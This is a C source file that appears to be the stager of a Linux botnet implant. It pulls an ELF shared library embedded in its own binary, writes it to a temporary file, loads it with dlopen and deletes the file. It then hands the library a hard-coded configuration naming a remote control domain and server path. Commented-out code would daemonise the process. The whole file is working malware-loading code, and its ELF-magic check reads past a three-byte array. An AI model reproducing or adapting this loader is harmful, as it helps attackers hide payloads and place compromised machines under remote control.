
#include <dlfcn.h> 
#include <stdio.h>  
#include <stdlib.h> 
#include <string.h> 
#include <unistd.h>
#include <signal.h> 
#include <sys/stat.h>  

#ifdef DEBUG
#define debug_msg(format,...)   \
    fprintf(stdout,format,##__VA_ARGS__)
#else
    #define debug_msg(format,...)
#endif   /* DEBUG */

   static char droneConf[160]= "Luhsg8jOSJRnOioo8lEUPltN2X4W6qEm""\xbb\x01""systemsettingsbroker.top""\x00""systemsettingsbroker.top""\x00""/x/Queen/public_html/""\x00";    
 //static char droneConf[160]= "EnWRpho6TKLfSWFP8qbsKPpe9DhW0813""\x50\x00""192.168.93.1""\x00""192.168.93.1""\x00""/bmc/queen/public_html/srv/""\x00";	


void * initDrone(char * soName,int showinfo){
	char * mid[100] = {0};
    void * (*init) (char *);
	char *error;

    void * droneExec = 0;
    void * handle = dlopen (soName, RTLD_LAZY);  
	if (handle) {    
		init = dlsym(handle, "init");  
		if ((error = dlerror()) != NULL)  {  
			debug_msg("dlsym init fail \n");
			dlclose(handle);			
		}else{
			void * funcExec = dlsym(handle, "exec");  
			if ((error = dlerror()) != NULL)  {  
				debug_msg("dlsym exec fail \n");
				dlclose(handle);
			}else{						
				void * j = init ((char *)mid);
				if (0 == j){
					debug_msg("init return 0, fail \n");
				}else if ((void *)-1 == j){ //reject load
                    debug_msg("init return -1, fail \n");
				}else{
					droneExec = funcExec;
				}
			}
		}
		//dlclose(handle);
	}else{
	    debug_msg("dlopen fail \n");
		if (showinfo){
			printf("dlopen - %s \n", dlerror());
		}
	}

	return droneExec;
}

void init_daemon(){ 
	int pid; 
	int i; 
	if((pid = fork())) exit(0); //父进程，退出 

    else if(pid < 0) exit(1); //fork失败 

    /* 子进程继续执行 */ 
	setsid(); //创建新的会话组，子进程成为组长，并与控制终端分离 

	/* 防止子进程（组长）获取控制终端 */ 
	if((pid = fork())) exit(0); //父进程，退出 

	else if(pid < 0) exit(1); //fork错误，退出 

	/* 第二子进程继续执行 , 第二子进程不再是会会话组组长*/ 

    chdir("/tmp"); /* 切换工作目录 */ 
	umask(0); /* 重设文件创建掩码 */ 
	return; 
} 


int get_selfname(char * selfname,int namelen){
    char sysfile[15] = "/proc/self/exe";

    if ( -1 != readlink(sysfile, selfname,  namelen)){
        return 0;
    }
	return -1;
}

unsigned long get_file_size(const char *path)  
{  
    unsigned long filesize = -1;      
    struct stat statbuff;  
    if(stat(path, &statbuff) < 0){  
        return filesize;  
    }else{  
        filesize = statbuff.st_size;  
    }  
    return filesize;  
}  


#pragma pack(1)
typedef struct{
	unsigned char M[3];
}elf_header;
#pragma pack()
void * seekDroneSo(void * lpDroneSo,size_t * selfSize){
	void * ret = 0;
	
    (* selfSize) --;
	lpDroneSo ++;	
    while ((* selfSize) > 10){	
	    elf_header * tmp = lpDroneSo;
        if ((tmp->M[0] == 0x7F) && (tmp->M[1] == 0x45) && (tmp->M[2] == 0x4C) && (tmp->M[3] == 0x46)){
			ret = lpDroneSo;
			break;
        }		
		(* selfSize) --;
		lpDroneSo ++;
		//printf (".");
    }

	return ret;
}


int main(int argc,char *argv[]){
    int showinfo = 0;
	if (argc > 1){
		u_char     *p;
        p = (u_char *) argv[1];
		if (*p++ == '-') {
            if (*p++ == 'd'){
				showinfo = 1;
            }    
        }
	}

    int  namelen = 256;
    char selfname[256];
    memset(selfname,0,256);
	if (0 != get_selfname(selfname,namelen)){
		if (showinfo){
           printf("fail to get selfname \n");
		}
	    return 0;
	}

    size_t selfSize = get_file_size(selfname);
    
	char * selfBuff = malloc(selfSize);

	if (!selfBuff){
		if (showinfo){
			printf("fail to malloc self Buf,size: %zu\n",selfSize);
		}
		return 0;
	}

    FILE * handle = fopen(selfname,"rb");
	if (handle){
		fread (selfBuff , sizeof(char), selfSize, handle);
		fclose(handle);
	}else{
	    if (showinfo){
			printf("fail to open self filename: %s \n",selfname);
		}
		return 0;
	}
		
    size_t dwDroneSoSize = selfSize;
	void * lpDroneSo     = selfBuff;

	debug_msg ("lp %p , size %zu \n",lpDroneSo,dwDroneSoSize);
           lpDroneSo = seekDroneSo(lpDroneSo,&dwDroneSoSize);    

	debug_msg ("lp %p , size %zu \n",lpDroneSo,dwDroneSoSize);

	if (!lpDroneSo){
		if (showinfo){
			printf("fail to seek drone \n");
		}
		return 0;
	}

	//signal(SIGCHLD, SIG_IGN); /* 忽略子进程结束信号，防止出现僵尸进程 */ 

   // init_daemon(); 

    void* droneExec = 0;

	char * tmpFileName = tempnam(0,0);
	if (tmpFileName){
		debug_msg ("Temporary file name is: %s\n",tmpFileName);			

		FILE * handle = fopen(tmpFileName,"wb");
		if (handle){		
			fwrite (lpDroneSo, sizeof(char), dwDroneSoSize, handle);	
			fclose(handle);
			droneExec = initDrone(tmpFileName,showinfo);
		}			
		unlink(tmpFileName);
		free (tmpFileName);
	}else{
		debug_msg ("fail: Temporary file name return nil \n");
	}

	free (selfBuff);

	if (droneExec){
		void (*exec) (void **);
		exec = droneExec;
		void * df = &droneConf;
		exec(&df);
	}

	return 0;

}
